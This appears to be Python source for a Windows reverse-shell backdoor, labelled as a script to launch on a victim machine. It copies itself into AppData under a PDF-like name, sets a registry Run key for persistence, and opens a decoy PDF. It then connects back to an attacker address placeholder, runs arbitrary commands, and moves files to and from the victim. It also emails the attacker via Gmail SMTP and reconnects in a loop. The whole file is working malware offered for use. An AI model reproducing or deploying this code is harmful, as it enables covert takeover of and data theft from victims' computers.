#script to launch on victim machine
import smtplib
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import time



class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Notes_Qos_indexe.pdf"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Default /t REG_SZ /d "' + evil_file_location + '"',shell=True)
            file_name = sys._MEIPASS + "\moyennes_QoS-2022.pdf"
            subprocess.Popen(file_name, shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_commands(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful..."

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "quit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_commands(command)
            except Exception:
                command_result = "[-] Error during command execution"
            self.reliable_send(command_result)

    def send_mail(self):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login("email where to recieve mails", "it's password")
        #you have to enable functionality to send mails from apps other than gmail
        server.sendmail("email where to recieve mails", "email where to recieve mails", "the email you want to send after the connection is established")
        #we put same sender and reciever adress since you will recieve the mails that you've launched in your inbox
        server.quit()




while True:
    try:
        my_backdoor = Backdoor("adress ip of attacker", 8080)
        #port can be 8080 on any non frequently used port
        my_backdoor.send_mail()
        my_backdoor.run()
    except Exception:
        time.sleep(10)
        continue